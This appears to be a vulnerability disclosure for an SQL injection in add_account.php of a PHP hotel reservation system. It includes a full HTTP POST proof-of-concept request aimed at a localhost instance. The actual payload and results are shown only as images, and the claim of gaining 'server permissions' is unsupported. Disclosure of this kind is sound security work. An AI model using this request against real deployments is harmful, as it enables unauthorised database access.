# Simple Online Hotel Reservation System

## supplier 
https://code-projects.org/simple-online-hotel-reservation-system-in-php-with-source-code
## Vulnerability file
add_account.php name.php

## describe

**Code analysis**   

In the add_account.php file of Simple Online Hotel Reservation System, theuser name parameter is obtained, and the SQL statement is concatenated to the SQL statement without filtering the execution, resulting in SQL injection vulnerabilities and server permissions

![image-2025](https://github.com/asd1238525/cve/blob/main/8c25f249-fe2e-47df-9eaf-43af82da243e.png)


## POC

```
POST /simplehotel/HOR/admin/add_account.php HTTP/1.1
Host: 127.0.0.1:8083
Content-Length: 41
Cache-Control: max-age=0
sec-ch-ua: 
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: ""
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8083
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:8083/simplehotel/HOR/admin/add_account.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=s5o8pk3psueru08ci1jjc6b3if
Connection: close

name=1&username=1&password=1&add_account=

```

**Result**
![image-2025](https://github.com/asd1238525/cve/blob/main/3e4127a1-3b76-454a-8ed4-034a9d5940cf.png)
Get payload:
![image-2025](https://github.com/asd1238525/cve/blob/main/504ac369-0993-4a0d-bb37-080ad3bc68ce.png)